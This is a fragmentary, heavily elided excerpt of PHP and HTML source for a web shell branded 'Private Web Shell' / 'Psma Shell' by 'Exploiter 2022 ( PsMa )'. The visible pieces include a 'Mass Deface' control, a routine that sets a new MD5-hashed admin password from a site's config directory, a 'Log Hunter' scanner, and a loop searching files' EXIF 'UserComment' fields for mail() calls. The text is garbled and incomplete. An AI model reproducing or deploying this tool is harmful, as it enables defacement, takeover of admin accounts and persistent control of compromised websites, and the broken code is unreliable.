...
for ($i = 0; $i < $___; $i++) {
	...
	<body>
		...
		<div class="container">
			...
			<div class="y x">
				<a href="?" class="ajx">
					<font color="black">Private Web Shell</font>
				</a>
			</div>
		...
		<input class= 'form-control' type='submit' name='start' value='Mass Deface' style='width: 450px;'>
			...
			if ($_POST['hajar']) {
				if (strlen($_POST['pass_baru']) < 6 or strlen($_POST['user_baru']) < 6) {
					...
					$pass_baru = md5($_POST['pass_baru']);$conf = $_POST['config_dir'];
...
<form method="POST" action=""  class="header-izz">
    ...
    <input class = "form-control" type="submit" style="width: 150px; height: 40px; border-color=white;margin:10px 2px 0 2px;" value="Scan" class="kotak"></p>
					...
					echo '<hr><br>';
					echo "<Center>\n";
					echo "<h2>Log Hunter Psma Shell</h2>";
					echo "<form action=\"\" method=\"post\">\n";
...
*/
																																				...
																																				foreach (scandir($shcdirs) as $shc) {
																																					if ($shc != '.' && $shc != '..') {
																																						...
																																						if (!is_dir($shc) && !eregi("css", $shc)) {
																																							...
																																							$jembut = "COMPUTED";$taik   = "UserComment";
																																							$shcm = "/mail['(']/";
																																							if ($ifgt[$jembut][$taik]) {
				...
				<footer class="x">
					<center>&copy; Exploiter 2022 ( PsMa ) </center>
				</footer>
				<?php
				if (isset($_GET["1"])) {
					echo $f;
